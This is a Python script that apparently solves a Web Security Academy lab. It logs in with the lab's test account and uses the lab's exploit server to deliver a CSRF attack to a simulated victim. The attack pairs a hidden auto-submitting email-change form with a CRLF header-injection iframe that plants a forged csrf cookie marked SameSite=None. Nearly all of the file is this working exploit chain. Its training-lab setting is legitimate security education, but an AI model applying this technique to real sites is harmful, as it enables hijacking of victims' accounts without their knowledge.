import typer
from lxml import html
from requests import Session

from rich.console import Console

SERVER = "https://0ac5007904eb50e0c0c81400006f0094.web-security-academy.net"

INJECTED_HTML = f"<form id=\"email-form\" action=\"{SERVER}/my-account/change-email\" method=\"POST\">" \
                "<label>Email</label>" \
                "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
                "<input required="f" type=\"hidden\" name=\"csrf\" value=\"ciaoatutti\">" \
                "</form>" \
                f"<iframe style=\"display:none\" src=\"{SERVER}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"

console = Console()
app = typer.Typer()


def login(session):
    response = session.get(f"{SERVER}/login")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
    console.log(f"CSRF Token: {csrf_token}")
    response = session.post(f"{SERVER}/login", data={
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    })
    return response.history


def get_exploit_server(session):
    response = session.get(f"{SERVER}/")
    html_document = html.fromstring(response.content)
    exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
    session.get(f"{exploit_server_link}")
    console.log(f"Exploit server status code: {response.status_code}")
    return exploit_server_link


def exploit_server_operation(session, mode: str):
    session.post(f"{get_exploit_server(session)}", data={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\n"
                        "Content-Type: text/html; charset=utf-8",
        "responseBody": INJECTED_HTML,
        "formAction": mode
    })


def check_lab_solver(session):
    response = session.get(f"{SERVER}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    if solved_link:
        console.log('Congratulations, you solved the lab')
    else:
        console.log('Not solved')


def main():
    session = Session()
    with console.status("Login..."):
        login(session)
    with console.status("Go to exploit server..."):
        get_exploit_server(session)
    with console.status("Storing..."):
        exploit_server_operation(session, "STORE")
    with console.status("Delivering to the victim"):
        exploit_server_operation(session, "DELIVER_TO_VICTIM")
    with console.status("Checking solving lab"):
        check_lab_solver(session)


if __name__ == "__main__":
    main()
